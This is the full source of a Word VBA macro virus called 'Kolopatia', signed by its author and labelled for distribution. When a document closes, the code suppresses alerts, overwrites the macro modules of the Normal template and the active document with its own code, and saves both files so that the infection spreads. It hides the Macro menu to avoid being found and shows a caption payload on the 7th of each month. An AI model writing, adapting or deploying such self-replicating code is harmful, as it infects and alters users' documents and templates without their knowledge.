   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'Kolopatia
   Private Sub Document_Close(): d = d + 1
   ShowVisualBasicEditor = False: Application.DisplayAlerts = wdAlertsNone
   vLin = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, _
   ThisDocument.VBProject.VBComponents(d).CodeModule.CountOfLines)

   If NormalTemplate.VBProject.VBComponents(d).CodeModule.Lines(d, d) <> "'Kolopatia" Then

       With NormalTemplate.VBProject.VBComponents(d).CodeModule

           .DeleteLines d, .CountOfLines: .AddFromString vLin

       End With

   End If

   If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(d, d) <> "'Kolopatia" Then

       With ActiveDocument.VBProject.VBComponents(d).CodeModule

           .DeleteLines d, .CountOfLines: .AddFromString vLin

       End With

   End If

   ActiveDocument.SaveAs ActiveDocument.FullName
   NormalTemplate.Save

   If Day(Now()) = 7 Then

       With Application

           .Caption = Application.UserName

           With .Assistant

               .Animation = msoAnimationGreeting

           End With

       End With

   End If

   CommandBars("Tools").Controls("Macro").Visible = False

   End Sub
   'Kolopatia by e[ax]
   'Authorized Distribution for Bosnia and Herzegovina
